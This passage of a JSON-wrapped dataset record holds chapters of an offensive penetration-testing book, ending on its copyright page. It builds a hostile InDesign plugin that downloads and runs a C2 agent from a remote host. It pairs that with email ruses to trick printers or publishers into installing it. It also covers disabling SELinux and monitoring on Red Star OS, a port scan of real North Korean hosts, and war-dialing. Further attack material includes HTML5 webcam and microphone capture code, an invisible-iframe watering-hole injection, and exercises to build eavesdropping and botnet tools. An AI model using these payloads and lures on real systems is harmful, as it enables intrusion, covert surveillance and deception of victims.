GetPlugIn()\n{\nsystem(\"curl -O http://c2server/c2agent\")\nsystem(\"./c2agent\")\nreturn &gPlugIn;\n}\n// End, SDKPlugInEntrypoint.cpp\nNow build the plugin within Xcode, as shown in Figure 8.9.\nFigure 8.9: Xcode build menu.\nIf all goes well, you will now have an InDesign plugin. Usually these have a\n.pln or .framework extension, but depending on the version of Xcode you are\nusing, on the Mac it may not have an extension at all. Copy this plugin into a\nsubdirectory of your InDesign plugins folder. Again this varies by version, but\nit's usually easily found with the Application window in Finder, as shown in\nFigure 8.10.\nFigure 8.10: C2 agent extension payload.\nSo we've got a very simple hostile plugin that we need our target to install.\nWhat should we do, simply send it to them? That's outside the workflow of\nthis world. InDesign, being a publishing application, needs to ensure that all\ndependencies are met before a document is handed off from an editorial team\nto a printing house. For example, if a particular font is required and the\nprinter doesn't have that font installed on their machine, there's a problem.\nThe same if a document needs a particular plugin.\nTo resolve this problem, InDesign has a package functionality that can include\nall of the required dependencies in the handoff document. This way, if a\nplugin (say, for example, our C2 agent) is not available, it will be installed\nwhen the recipient opens the package. That's a one-click process within\nInDesign but we have a lot of options as to what to include (or indeed\nexclude), as shown in Figure 8.11.\nFigure 8.11: Pre-flight packaging in InDesign.\nThe rest is social engineering. The question is who to attack, the printers or\nthe publishers? We could pretend to be a client of the printer and send them a\npayload bearing InDesign document, but that will likely unravel fast.\nA good strategy is the old misaddressed email ruse, as it will get the document\nopened but quickly dismissed when the target realizes it was not intended for\nthem. A quick follow-up email a few minutes later, saying “Sorry—not for\nyou!” will aid in this mental dismissal process.\nOf course, given that our intention is to modify documents after the editorial\nprocess but before printing, we could go a lot further than this simple SDK\nexample. Instead of deploying C2, we could use the SDK to find and modify\ndocuments. It contains all the functionality to automate any kind of InDesign\nfunctionality. The effectiveness of such an attack will depend on the lead time\nan attacker has.\nSummary\nThe lesson from the start of this book has been that the nature of threat\nchanges but stays the same. As technologies are phased out, new ones emerge\nto take their place and there is no reason to think that they will be any more\nsecure than their predecessors. The difference between a successful attack\nand a failed mission is how well you understand the target, its processes, and\nthe technologies on which it is reliant. Once you're able to follow their\nworkflow, you will be able to discover and exploit vulnerabilities within it.\nIn the example of the InDesign document, it should go without saying that\ntrusting a plugin from a third party that could do anything is a serious\nsecurity vulnerability. However, most people who use InDesign will never\nconsider this possibility, as it's just like any other InDesign plugin they\nencounter on a daily basis. The way they are packaged and deployed is a\nnecessary fact of life for anyone involved in either editing and signing off on\ncontent or receiving it for printing and publication. This analogy can be\nextended to any business.\nExercises\n1. Explore the various means of deploying rich content in a web browser and\nhow these tools and technologies can be subverted to deliver attacks (both\ntechnological and social engineering based). There are many to choose\nfrom. To start with, download the free demo of Mulitmedia Fusion. Note\nhow quickly complex content can be created using this software as well as\nthe diverse environments it can deploy to.\n2. Explore network protocols that are essential to the internal functioning of\na network such as ARP, ICMP, RIP, and OSPF. How could these be used to\ncarry data covertly? Start with ARP, which allows broadcast\ncommunication. This is handy, as we've seen in this chapter, but also could\nbe used to carry data between two IP addresses on a network without the\nuse of a broadcast.\n3. Study the concept of leader election and how it can be leveraged in creating\nautonomous C2 environments. This can go well beyond the control of\nsimple C2 agents in one target network and can be used in the creation of\nInternet-wide autonomous botnets.\n4. Bonus exercise (just for fun). We talked a lot about social engineering in\nthis chapter and one of the elements of being successful there is sounding\nauthentic over the telephone. Assuming you're a native English speaker,\nlearn to speak in an accent unfamiliar to you. If you speak one of the many\nforms of British English, Californian English is the easiest to master, so\npick something like Brooklyn or Cajun—these will be more challenging.\nOn the other hand, if you're an American, then British Received\nPronunciation is hard to master, as is British West Country. Actors often\nneed to learn another accent professionally and there are consequently\nplenty of courses available for such purposes.",
    "question": "What are the key techniques and strategies for using social engineering in penetration testing, particularly in the context of subverting a target's workflow to deliver a payload?",
    "summary": "This chapter explores advanced social engineering techniques, including cold reading, the use of fuzzy and rainbow facts, and flattery, to manipulate targets and extract information. It also discusses creative ways to deliver payloads using technologies like Java Web Start and Adobe AIR. The chapter concludes with a detailed example of how to create a hostile InDesign plugin to subvert the publishing process and deliver a C2 agent."
  },
  {
    "start": 59,
    "end": 67,
    "text": "Chapter 9\nNorthern Exposure\nThroughout this book we have examined the various aspects involved in\nmodeling APT scenarios by discussing attacks against live targets in various\nsectors. In this last chapter, we're going to do something a little different.\nRather than outline an attack on a legitimate target, we're going to look at a\nhypothetical intelligence gathering on a nation state. I've chosen North Korea\nas the target for several reasons but mostly that the massive secrecy that\nsurrounds that hermit state, the various IT tech, and the considerable (indeed\nunprecedented) censorship that its citizens deal with on a daily basis make it\nan intriguing example and allows me to demonstrate how much information\ncan be inferred from what is publicly available.\nThat, however, is not the only reason. Unlike any other nation state, North\nKorea can more easily be described in terms similar to a closed corporation\nboth in a geopolitical and technological sense rather than just another country\n(at least from a macroscopic perspective)—granted it's not a company I would\nwant to work for but secrecy is anathema to a good security consultant and it\nis therefore impossible not to be intrigued by its inner workings.\nAgainst this backdrop, I can introduce some other approaches to advanced\npenetration testing that you should be familiar with, whether they are revived\nold school techniques—tried and tested—or newer, more emerging ideas.\nTherefore, examining North Korea as a closed nation state but within the\nanalogous context of a corporate penetration test allows us to treat the\nanalysis as a total process.\nWe'll look at the technologies that North Korea deploys such as:\nNorth Korea's custom Linux-based desktop and server operating systems\nIts Internet presence (and the allocation of its IP addresses)\nIts telephone network\nIts mobile telephone network and approved devices\nThe walled-garden North Korean Intranet\nOverview\nWhile the Democratic People's Republic of Korea (DPRK) uses various\nimported tech (Kim Jong-Un is a big fan of Apple), the general populace is not\nso lucky. Very few members of society enjoy unrestricted Internet access\n(though that is changing with the import of black market mobile phones from\nChina). Most people who have access to computer technology are forced to\nuse approved operating systems and devices and are restricted to a freely\naccessible Intranet called Kwangmyong ( ), meaning “light” or “bright”\nin English. This is a walled garden and completely separate from the public\nInternet as we know it. Needless to say, you won't find anything critical about\nKim or his regime here. This Intranet is accessible in various places—\nuniversities and cultural institutions—and is allegedly available via a dialup\nconnection with North Korea as well. DPRK has its own allocation of a /22\n(1,024 hosts) range of public IP addresses, although these are barely\npopulated. Despite this, the IPs are allocated very conservatively; for example\nthe Pyongyang University of Science and Technology has only one allocated\naddress.\nOperating Systems\nDPRK sells an “official” North Korean operating system called Red Star (at\nversion 3.0 at time of writing). Red Star comes in two flavors—desktop and\nserver—and are both based on Fedora Linux with Korea localizations. They\nare both designed to be highly restrictive from the ground up (albeit in\nslightly different ways, but we'll get to that). I will make both versions\navailable via torrents from my website should you want to play with them.\nRed Star Desktop 3.0\nFirst of all, let's examine Red Star Desktop, including its eccentricities and\nhow to exploit it. Figure 9.1 shows what the OS looks like when booted; it's\nrunning here in VMWare.\nFigure 9.1: Red Star Desktop.\nReaders may be forgiven for noting its resemblance to Apple's OS X, which to\nbe fair, has actually been quite nicely achieved. I, for one, find my Korean to\nbe a little rusty, so our first order of business will be to get the thing in\nEnglish so as to not be constantly referring to Google Translate. To do so, we\nfirst need to get a shell, as shown in Figures 9.2 and 9.3.\nFigure 9.2: Getting a shell.\nFigure 9.3: A shell.\nType the following, shown in Figure 9.4.\nFigure 9.4: Quicker and easier to work in English.\nThen a quick reboot and you'll see something like Figure 9.5.\nFigure 9.5: Red Star Linux in English.\nMuch more like it!\nThe assumption that the developers made with regard to the security and\nintegrity of the OS is that it is not possible for users to achieve root\npermissions and therefore would be unable to deal with the Discretionary\nAccess Control (DAC) provided by SE Linux, as various unpleasant other\nservices running with an eye to monitoring the users and their activity. This\nassumption is false, as I will demonstrate (note that this security model is\ncompletely different than Red Star Server 3.0, where root permissions are\ngranted by default and SE Linux is hardened to prevent it from being disabled.\nFirst things first, though).\nTo grant yourself root credentials, run the program rootsetting, as shown in\nFigure 9.6.\nFigure 9.6: Run rootsetting.\nThis will prompt you for a su password. Confirm it, as shown in Figure 9.7.\nFigure 9.7: Enter the credentials you created for your user.\nAt this point, you can elevate your privs to root using su, as shown in Figure\n9.8.\nFigure 9.8: Now we have root access.\nFirst, we need to disable SE Linux to disable the DAC, as shown in Figure 9.9.\nFigure 9.9: Disable Discretionary Access Control.\nThere are other services running that will reboot the system if you attempt to\nmodify certain systems. They are also designed to watermark files so that the\nNorth Korean government can track their origin. You'll want to kill those too\n(see Figure 9.10).\nFigure 9.10: Disable monitoring processes.\nAt this point we can look around a little. Launch the default browser, which is\ncalled or naenara (“my country” in English). This is just a rebadged\nversion of Firefox, but what is interesting here is that its homepage is\n10.76.1.11, which is obviously a non-routable IP address. The reason for this is\nthat Red Star is intended to be run within the walled garden and this is the IP\naddress for the Intranet's home page, which sadly we can't see from here. The\ndefault search engine for the browser is Google Korea.\nNow, we can add a local repository and install all the optional packages\n(should we want to do so).\nRed Star Server 3.0\nWhile sharing the same codebase, the server variant of the operating system\nhas a completely different security model. You are granted root privileges out\nof the box; however, the root user cannot disable SE Linux in the same way\nthat it can in the Desktop version. See Figure 9.11.\nFigure 9.11: Red Star Linux Install Screen.\nYou then get to choose a desktop manager, as shown in Figure 9.12.\nFigure 9.12 Choose Desktop Manager.\nThe desktop server is a little more minimal than the desktop. Figure 9.13\nshows it rendered in English.\nFigure 9.13: Once again, better to work in English.\nThere are several ways to disable SE Linux, but you won't be able to modify\nbootloader options or the SE Linux config files. The best approach is to mount\nthe VMDK files as an OS volume and modify them from there or, if you've\ninstalled on bare metal, boot with another OS and do the same thing. To\ndisable SE Linux permanently, you need to do the following to the\n/etc/selinux/config file:\n# This file controls the state of SELinux on the system.\n# SELINUX= can take one of these three values:\n# enforcing - SELinux security policy is enforced.\n# permissive - SELinux prints warnings instead of enforcing.\n# disabled - No SELinux policy is loaded.\nSELINUX=permissive\n# SELINUXTYPE= can take one of these two values:\n# targeted - Only targeted network daemons are protected.\n# strict - Full SELinux protection.\nSELINUXTYPE=targeted\nAt this point, you can install whatever you want, as with the desktop version.\nWhile playing with the Red Star OS is an educational insight into the sort of\ntotalitarianism that the people there live with every day, it doesn't give us a\ngreat deal of insight into the layout of the networking technology. I'd\nconsidered travelling to North Korea as a tourist and figuring out a way to\naccess their Intranet so I could map it properly, but thirty years breaking\nrocks is not my idea of a good time. So if anyone reading this would like to\nvolunteer for that particular mission, you can contact me through the\npublisher.\nThe next step is to look at their publicly facing Internet addresses.\nNorth Korean Public IP Space\nDPRK IP space is administered by the Star Joint Venture Co LTD in\nRyugyong-dong Potong-gang District and is upstreamed to the CNCGroup\nbackbone in China.\nNorth Korea has been allocated a /22 IP space, that is to say:\n175.45.176.0/22 or 175.45.176.0-175.45.179.256\nIt has the potential for approximately 1,000 IP addresses. Needless to say,\nthere are nowhere near that many in use. Using Masscan, we can knock up a\nquick-and-dirty port scan in about an hour that will give us a snapshot in time\nof what's up and running:\nHost: 175.45.178.154 () Ports: 5800/open/tcp////\nHost: 175.45.178.154 () Ports: 6002/open/tcp////\nHost: 175.45.178.154 () Ports: 5801/open/tcp////\nHost: 175.45.178.131 () Ports: 36697/open/tcp////\nHost: 175.45.178.133 () Ports: 2105/open/tcp////\nHost: 175.45.178.154 () Ports: 6004/open/tcp////\nHost: 175.45.178.131 () Ports: 80/open/tcp////\nHost: 175.45.178.154 () Ports: 5900/open/tcp////\nHost: 175.45.178.154 () Ports: 5804/open/tcp////\nHost: 175.45.178.154 () Ports: 111/open/tcp////\nHost: 175.45.178.133 () Ports: 53272/open/tcp////\nHost: 175.45.178.154 () Ports: 5903/open/tcp////\nHost: 175.45.178.129 () Ports: 22/open/tcp////\nHost: 175.45.178.154 () Ports: 5802/open/tcp////\nHost: 175.45.178.133 () Ports: 2103/open/tcp////\nHost: 175.45.178.154 () Ports: 10000/open/tcp////\nHost: 175.45.178.133 () Ports: 1801/open/tcp////\nHost: 175.45.176.16 () Ports: 53/open/tcp////\nHost: 175.45.176.9 () Ports: 53/open/tcp////\nHost: 175.45.178.55 () Ports: 25/open/tcp////\nHost: 175.45.178.154 () Ports: 22/open/tcp////\nHost: 175.45.176.72 () Ports: 80/open/tcp////\nHost: 175.45.178.154 () Ports: 5902/open/tcp////\nHost: 175.45.178.154 () Ports: 5904/open/tcp////\nHost: 175.45.178.154 () Ports: 3128/open/tcp////\nHost: 175.45.178.154 () Ports: 39908/open/tcp////\nHost: 175.45.178.133 () Ports: 2107/open/tcp////\nHost: 175.45.178.154 () Ports: 6003/open/tcp////\nHost: 175.45.178.154 () Ports: 5901/open/tcp////\nHost: 175.45.178.154 () Ports: 5803/open/tcp////\nHost: 175.45.176.15 () Ports: 53/open/tcp////\nHost: 175.45.176.8 () Ports: 53/open/tcp////\nHost: 175.45.178.154 () Ports: 3306/open/tcp////\nHost: 175.45.178.154 () Ports: 6001/open/tcp////\nHost: 175.45.176.73 () Ports: 80/open/tcp////\nHost: 175.45.178.129 () Ports: 23/open/tcp////\n# Masscan done at Tue Sep 27 12:20:31 2016\nGetting reliable scans of this range is a pain given that the quality of the link\ninto DPRK is anything but reliable. For example, we know that the web server\nfor The Kim Il Sung University (http://www.ryongnamsan.edu.kp/univ) is at\n175.45.176.79, but it doesn't show in this scan despite being up at the time.\nNonetheless, it's informative as to what isn't filtered from the Internet.\nThere's an old VNC server vulnerable to various attacks at 175.45.178.154:\nroot@wil:~# telnet 175.45.178.154 5900\nTrying 175.45.178.154…\nConnected to 175.45.178.154.\nEscape character is '^]'.\nRFB 003.008\nA MySQL server at 175.45.178.154.\nA Telnet port for a Cisco router at 175.45.178.129.\nroot@wil:~# telnet 175.45.178.129\nTrying 175.45.178.129…\nConnected to 175.45.178.129.\nEscape character is '^]'.\nUser Access Verification\nUsername:\nAn insecure version of squid proxy at 175.45.178.154 (Figure 9.14):\nFigure 9.14: Insecure Squid Proxy.\nThere are open RPC ports and assorted SSH daemons using password\nauthentication. There's even a webmin server, as shown in Figure 9.15.\nFigure 9.15: Webmin Interface.\nDoSing the DNS server at 175.45.176.16 would prevent all name resolutions\nfor the .KP top-level domain.\nAll in all, I would expect this range to be a hell of a lot more locked down than\nit is, as there are various avenues of attack here (should one be so inclined).\nHowever, North Korea or not, we shall err on the side of international law and\nnot let temptation get the better of us.\nThe North Korean Telephone System\nDialing into North Korea is tricky at best. Most phone numbers are not\nreachable directly and require you to go through the operator at +850 2 18111\n(850 is the country code for DPRK and 2 is Pyongyang). This works both\nways, with most lines unable to directly call out to the rest of the world.\nPhone numbers in DPRK that can receive international calls (and conversely,\ncall out of the country without restriction) always begin with the number 381,\ndirectly following the area code. For example, the British Embassy in\nPyongyang has the phone number +850 2 381 7982. Numbers that can dial\ninternationally cannot dial locally; therefore, it is usual for such organizations\nto have two phone numbers with the 381 prefix substituted for 382.\nAccording to Mr. Ri Jung Won, Director, Department of International\nRelations, the Ministry of Posts and Telecommunications, the current\nnumbering format of North Korea looks like this:\nLIST OF ALLOCATIONS IN 2011\nArea Code Length of Customer Number City Name Province Name\n2 11 Pyongyang Pyongyang\n2 12 Pyongyang Pyongyang\n2 18 3 digits Pyongyang Pyongyang\n2 381 4 digits Pyongyang Pyongyang\n2 771 4 digits Pyongyang Pyongyang\n2 772 4 digits Pyongyang Pyongyang\n2 880 13 digits Pyongyang Pyongyang\n2 881 13 digits Pyongyang Pyongyang\n2 882 13 digits Pyongyang Pyongyang\n2 883 13 digits Pyongyang Pyongyang\n2 885 13 digits Pyongyang Pyongyang\n195 7 digits Pyongyang Pyongyang\n31 6 digits Pyongsong South Phyongan\n39 6 digits Nampo Nampo\n41 6 digits Sariwon North Hwanghae\n43 Songnim\n45 6 digits Haeju South Hwanghae\n49 6 digits Kaesong North Hwanghae\n53 6 digits Hamhung South Hamgyong\n57 6 digits Wonsan Kangwon\n61 6 digits Sinuiju North Phyongan\n67 6 digits Kanggye Jagang\n73 6 digits Chongjin North Hamgyong\n79 6 digits Hyesan Ryanggang\n82 Rajin Kwanbuk\n85 29 4 digits Rason Rason\n86 Sonbong\nThere are three mobile network prefixes:\n0191: Koryolink WCDMA Network\n0192: Koryolink WCDMA Network\n0193: SunNet GSM900 Network\nAdditionally, the Rason Economic Special Zone has a prefix of 3 and many\nmore lines are directly reachable given the international businesses operating\nthere (mostly Russian, Chinese, and South Korean).\nA number of cell phones also permit receiving international calls, although\nthis is something that has to be requested by the subscriber and is not\npermitted to private individuals. The cell phone infrastructure was built and\noperated by the Egyptian firm Orascom as Koryolink; however, it has been\nreported that the North Korean government denied permission for Orascom\nto repatriate profits from the project and in November 2015 they claimed to\nhave effectively lost control of the infrastructure and are owed millions of\ndollars—a cautionary tale for any budding tech investors thinking of\nexpanding into the hermit kingdom.\nSo this is all very interesting, but what does it bring to the table? Back in the\ndays before the massive uptake of the Internet, a lot of computer servers were\nattached to the telephone network, and the only way to access them was via\ndialup modems. Hunting for modems to attack was called war dialing and\ninvolved using a computer program to automatically dial huge swaths of\nnumbers and recording what was found at the other end of the line, whether\nit be a voice, voice mail, fax machine, modem, PBX, or other tone. This was\nmost popular in the United States, where local calls were free. In the UK, the\nfree phone exchanges were usually targeted. The software mainly used to\nachieve this was called Toneloc (see Figure 9.16) and it would produce\nawesome maps of up to 10,000 numbers. It still works fine today.\nFigure 9.16: Toneloc output.\nWhat would be fun is if we could do the same thing and call every inbound\nnumber in Pyongyang to find modems. Who knows what we might find? Of\ncourse, there is a slight problem with this approach in that calling Pyongyang\nis expensive and calling there 10,000 times would be prohibitively so.\nWhat we can do is use a VoIP calling solution to defray our costs somewhat—\nit's still expensive and the cheapest solution is 0.2 U.S. cents a minute (and\ntherefore per call, as that's the minimal calling unit), but it's the best we can\ndo. This still sounds expensive and potentially it could be, but remember that\nyou'll only be billed for the numbers that pick up.\nThe only problem is that we can't carry data calls over VoIP given issues with\ncompression (among other things), so the problem has to be approached in a\nslightly different way. Rather than using a modem and recording connections,\nthe software we will use takes an audio sample of the response and performs\na Fast Fourier Transform on it so the tones can be analyzed. Any tones that\nfall within a certain frequency we log as modems. Modem responses will\ncontain the following tone DTMFs:\n2250hz + 1625hz, 1850hz, 2000hz…\nLuckily, a chap named HD Moore did all the hard work for us by creating a\nsoftware suite called WarVOX. All we need to do is give WarVOX our VoIP\naccount details and the number ranges we want to dial. Then we sit back and\nwait. You can get it at https://github.com/rapid7/warvox.\nWarVOX uses a web interface and the first thing you'll need to do is add your\nVoIP service to the provider screen, as shown in Figure 9.17.\nFigure 9.17: WarVOX Configuration.\nYou're ready to start a new job (see Figure 9.18).\nFigure 9.18: Add targets to WarVOX.\nThe output is stored in PostgreSQL, so we can process it any way we like.\nRather than dump out 10,000 lines, let's have a look at some choice nuggets.\nWhile a lot of fax machines were detected, very few carriers (fewer than 50)\nwere noted.\nCarrier 1: An unpassworded Cisco router\nCarrier 2: An unpassworded PPPD stream\n……\nyyui343wfyyui343wfyyui343wfyyui343wfyyui343wfyyui343wfyyui343wfyyui343\nwfyyui343wfyyui343wfyyui343wfyyui343wfyyui343wfyyui343wf\nCarrier 3: An unknown BBS with bad ASCII art (see Figure 9.19).\nFigure 9.19: Old School!\nAs tempting as it is to probe these devices further, we shall once again resist.\nYes, it's North Korea and I'm not likely to be extradited any time soon, but the\nlaw is the law and this is not a manual on how to break it. Where I live, war\ndialing and port scanning are not illegal.\nApproved Mobile Devices\nThere is only one smartphone and one tablet that are approved for use in\nNorth Korea—both can be used to access the Kwangmyong walled-garden\nIntranet. It is, of course, claimed that these were developed locally under the\nguidance of the Dear Leader and accompanied by the inevitable pictures of\nhim inspecting the “factories” where they are made. In actuality, both devices\nare manufactured in China and rebadged locally with the nauseating patriotic\nimagery you should now be familiar with.\nThe Arirang ( ) (named after the semi-official national anthem of\nNorth Korea) is the only smartphone approved for use within DPRK. Despite\nclaims that it is pure North Korean technology, it is a rebranded Chinese\nUniscope U1201 running version 4.2.1 (at time of writing) of the Android\noperating system that has been modified to be as oppressive as the Red Star\noperating system. Needless to say, there is no Internet access.\nThere is also an “official” tablet device called the Samjiyon ( ), which is\nalso an Android device. It is equipped for 3G and can access the walled garden,\nbut the manufacturer claims that it does not have a WiFi adapter. This, it\nturns out, is erroneous. WiFi hardware is present but has been disabled and\nanyone with a little Android savvy can enable it. The Samjiyon is also,\naccording to local media, a North Korean invention and given the vast amount\nof cheap Chinese tablets available, it proved a little trickier to pinpoint exactly\nwhat the hardware was. However, a little analysis of the device's Android\nsystem files give it away, as shown in Figure 9.20.\nFigure 9.20: Yecon Tablet Device Information.\nIt's a Yecon 75 tablet made by Alps in Hong Kong, heavily customized for the\nNorth Korean consumer.\nThe “Walled Garden”: The Kwangmyong Intranet\nComparatively little is known about the North Korean Intranet. It's an IP-\nbased network that links various sites together within the country, such as\nuniversities and governmental organizations. Access is free to North Korean\ncitizens (assuming they can afford the equipment to access it), for whom it\nintends to provide all the news and information they need (or rather to\nrestrict them to what the government wants them to see, depending on your\nperspective). Based on the information available, the intranet conforms to\ninternal IP addressing, albeit inconsistently. Several different IP formats are\nin use, as can be seen in this list of hosts known to exist:\nKwangmyong http://10.41.1.2 Central\nInformation Agency for Science and Technology\n(Azalea) http://10.76.12.2\n(Trailblazer) http://10.208.0.34\nNaenara http://10.76.1.11 Naenara Information\nCenter\nNamsan http://192.168.1.101 Grand People's Study\nHouse\nRisang (Ideal) http://10.15.15.8 Kim Chaek University\nof Science and Technology\nAchim (Morning) http://172.16.34.100\n21 Information 21 http://10.21.1.22 Pyongyang\nInformatics Center\nScience & Technology Electronic Exhibition Center\nhttp://192.168.10.10 3 Three Revolution Exhibition Center\nGidung http://10.205.1.5 Chongjin Metal and\nMining University\nManbang http://10.61.61.3 Korean Central\nTelevision\nNew Century http://10.41.1.10 (CIAST)\nBangyong http://10.41.50.3\nRaeil http://10.66.1.3\nInvention http://10.41.50.9\nKlacksae (Woodpecker) http://10.240.100.11\nKim Il Sung University Information Center\nHanmaum (One Mind) http://10.76.1.20 Osan\nInformation Center\nNorth Pole Star http://10.76.1.2 National Network\nInformation Center\nWoods of Korea http://10.76.1.18 -\nJihyang http://10.208.1.2 Hamhung Chemical\nUniversity\nRungna http://172.16.4.200\nRungna Progam Center\nFlight http://10.15.15.5 Kim Chaek University of\nScience and Technology\nRodong Sinmun http://10.10.3.100 Rodong Sinmun\nLife http://10.65.3.2 Medical Science Information\nCenter\nOcean http://10.17.1.5 Ministry of Land and Maritime\nTransportation\nChollima http://172.16.11.23 Central Information\nand Communication Agency\nI would imagine the routing tables are a complete mess.\nAs I said, I would love to get inside this thing and map it out properly. I was\nhoping to find at least one carrier in the externally accessible phone range\nthat would elicit some kind of access to it, but that was wishful thinking.\nThere is no Internet access available from the Kwangmyong, which would\nmake the nature of it somewhat moot.\nIt should be noted at this point that the North Korean people are not stupid\nand, despite the endless stream of propaganda nonsense they are subjected to,\nmore and more of them have access to the Internet through black-market\nphones sourced from China. This is a technical not a political essay, but it is\nunlikely that such a regime will survive for long once Internet access becomes\nmore and more saturated.\nAudio and Video Eavesdropping\nThis final section is not in-depth enough to be classified as payload\ndeployment or C2 management in its own right, but as we've talked a little\nabout Android devices in this chapter, I wanted to include it. As an avenue of\nattack, it's nascent and will only become more relevant. Assuming that a C2\nagent has been successfully deployed to a target endpoint, capturing audio\nand video is trivial and can be achieved through a number of native or third-\nparty APIs. However, when attacking mobile devices or tablets, this can be\nmore troublesome. It is certainly possible to create apps that, when installed\nand given certain permissions, can be remotely triggered through push\nnotifications and the microphone and camera turned on and their contents\nstreamed.\nHowever, whether developing for iOS or Android, apps have to go through a\nreview process before being allowed in either the App Store or Google Play\nand the use of certain APIs in apps that manifestly don't need them will likely\nbe rejected during this process. For example, within the iOS operating there is\nan API called PushKit that contains two forms of such notifications—one that\nis standard and one for VoIP applications. The latter is needed to remotely\nenable call setup without having to maintain a permanent connection to the\nVoIP server, which will drain the battery fast. This particular API would be\nperfect for our needs, but using its functionality in an application that is\nmanifestly not for VoIP will certainly be rejected during the review process.\nHowever, with HTML5, we have access to a number of interesting API calls\nthat can be used to access both the microphone and the camera. The benefits\nof this approach are that the malware code can simply be inserted into a web\npage and is cross-platform. The attack will work as well on an Android Phone\nas within a Firefox browser running on Windows. The downside is that as\nHTML5 is still an emerging standard, not all API calls are supported across all\nbrowsers. This of course will improve and HTML5 will likely provide\ninteresting future avenues of attack.\nThe following code is the simplest possible way to demonstrate the use of\nHTML5 in media streaming:\nnavigator.getUserMedia = navigator.getUserMedia ||\nnavigator.webkitGetUserMedia ||\nnavigator.mozGetUserMedia ||\nnavigator.msGetUserMedia;\nvar video = document.querySelector('video');\nif (navigator.getUserMedia) {\nnavigator.getUserMedia({audio: true, video: true}, function(stream)\n{\nvideo.src = window.URL.createObjectURL(stream);\n}, errorCallback);\n} else {\nvideo.src = 'somevideo.webm'; // fallback.\n}\nThis code is suggestive and illustrative and will require some forethought on\nyour part as to how to integrate this into your C2 solution.\nMost browsers calling the getUserMedia API will trigger a warning to the user.\nHowever, if you deliver the web page over SSL, this will only happen once and\nin future permission will be assumed. There is little coherence and agreement\nover security in the HTML5 standard as it currently stands.\nThe trick of course is getting the user to visit your web page, which takes us\nback into the realm of social engineering. There are two avenues of attack.\nOne approach (and this is the preferable one) is a waterhole attack. That is to\nsay that we embed our malicious code into an invisible iFrame of a site that\nwe have previously compromised and that is trusted by the target. The\nbenefits of this approach are two-fold. The first is trust: the target is much\nmore likely to accept any security related messages. The second is persistence:\nthis attack only works as long as the browser is not closed. A trusted website\nwill likely be left open even if it is in the background and the target is no\nlonger actively engaged with it.\nAn invisible iFrame can be injected as follows:\n<iframe width=\"700\" scrolling=\"no\" height=\"400\" frameborder=\"0\"\nsrc=\"hostile_code.html\" seamless=\"seamless\">\nNote that the seamless tag is another HTML5 oddity. I use it here because it's\nsupported under Chrome/Android.\nAnother approach is almost the reverse of this. You register a domain name\nthat is similar to the target, load the original website in, and create an iFrame\nalongside the hostile code.\nThere are other ways to grab audio/video from the target. Adobe Flash is one\nsuch possibility, but it's a technology that's going the way of the Dodo, so I\nwouldn't recommend it.\nSummary\nThere is a certain bitter irony here; the various Linux operating systems were\nintended to promote openness and collaboration in software development. To\nsee Linux turned into a tool of state control is quite unpleasant.\nThis final chapter was intended to be something a little different from the\nformat I have otherwise used throughout this book, not just because I wanted\nto illustrate some open source intelligence gathering techniques, but also\nbecause I wanted to finish on a different note, at a different pace. There are\nseveral conclusions you can take away from this chapter, perhaps the most\nobvious being that if you're reading this, then you are likely a free person\nliving in a free society and you probably take that for granted. If there's one\nlesson that can be learned from this book as a whole, it's that technology is a\ntwo-edged sword with very different implications for society, depending on\nwho's wielding it.\nExercises\n1. Download the Red Star Linux Desktop and play with it. What other\nconclusions or observations can you draw about the restrictions and\nmonitoring it places on users? North Korea is far from the only country to\ndevelop an oppressive OS to control its citizens. Another example is Nova,\nsponsored by the Cuban government, but there are others. Using what\nyou've learned in this chapter, acquire one and take it apart.\n2. Implement an attack that grabs audio and/or video from a client mobile\nhandset, tablet, or desktop. Consider technologies that we've touched on\nbefore, such as Adobe AIR or Java JWS. Consider how data should be\nstreamed back to your C2 server. If audio is being intercepted in the long\nterm, what automated techniques could be applied to the data to make\nintelligent analysis more automated?\n3. A complete list of which mobile browsers support which HTML5 functions\ncan be found at http://mobilehtml5.org/. From this list, consider other\nmeans of potential attack against mobile devices, whether it be remote\ncompromise, intelligence gathering, or Denial of Service attacks.\nAdvanced Penetration Testing: Hacking the Worlds’s Most Secure Networks\nPublished by\nJohn Wiley & Sons, Inc.\n10475 Crosspoint Boulevard\nIndianapolis, IN 46256\nwww.wiley.com\nCopyright © 2017 by John Wiley & Sons, Inc., Indianapolis, Indiana\nPublished simultaneously in Canada\nISBN: 978-1-119-36768-0\nISBN: 978-1-119-36771-0 (ebk)\nISBN: 978-1-119-36766-6 (ebk)\nNo part of this publication may be reproduced, stored in a retrieval system or transmitted in any\nform or by any means, electronic, mechanical, photocopying, recording, scanning or otherwise,\nexcept as permitted under Sections 107 or 108 of the 1976 United States Copyright Act, without\neither the prior written permission of the Publisher, or authorization through payment of the\nappropriate per-copy fee to the Copyright Clearance Center, 222 Rosewood Drive, Danvers, MA\n01923, (978) 750-8400, fax (978) 646-8600. Requests to the Publisher for permission should be\naddressed to the Permissions Department, John Wiley & Sons, Inc., 111 River Street, Hoboken, NJ\n07030, (201) 748-6011, fax (201) 748-6008, or online at http://www.wiley.com/go/permissions.\nLimit of Liability/Disclaimer of Warranty: The publisher and the author make no\nrepresentations or warranties with respect to the accuracy or completeness of the contents of this\nwork and specifically disclaim all warranties, including without limitation warranties of fitness for a\nparticular purpose. No warranty may be created or extended by sales or promotional materials.\nThe advice and strategies contained herein may not be suitable for every situation. This work is\nsold with the understanding that the publisher is not engaged in rendering legal, accounting, or\nother professional services. If professional assistance is required, the services of a competent\nprofessional person should be sought. Neither the publisher nor the author shall be liable for\ndamages arising herefrom. The fact that an organization or Web site is referred to in this work as a\ncitation and/or a potential source of further information does not mean that the author or the\npublisher endorses the information the organization or website may provide or recommendations it\nmay make. Further, readers should be aware that Internet websites listed in this work may have\nchanged or disappeared between when this work was written and when it is read.\nFor general information on our other products and services please contact our Customer Care\nDepartment within the United States at (877) 762-2974, outside the United States at (317) 572-\n3993 or fax (317) 572-4002.\nWiley publishes in a variety of print and electronic formats and by print-on-demand. Some\nmaterial included with standard print versions of this book may not be included in e-books or in\nprint-on-demand. If this book refers to media such as a CD or DVD that is not included in the\nversion you purchased, you may download this material at http://booksupport.wiley.com. For\nmore information about Wiley products, visit www.wiley.com.\nLibrary of Congress Control Number: 2017931255\nTrademarks: Wiley and the Wiley logo are trademarks or registered trademarks of John Wiley &\nSons, Inc. and/or its affiliates, in the United States and other countries, and may not be used\nwithout written permission. All other trademarks are the property of their respective owners. John\nWiley & Sons, Inc. is not associated with any product or vendor mentioned in this book.\nThis work is dedicated to the memory of Sir Terry Pratchett, OBE (1948–\n2015), for teaching me comedy and satire and the wisdom to know the\ndifference.\n“Do you not know that a man is not dead while his name is still 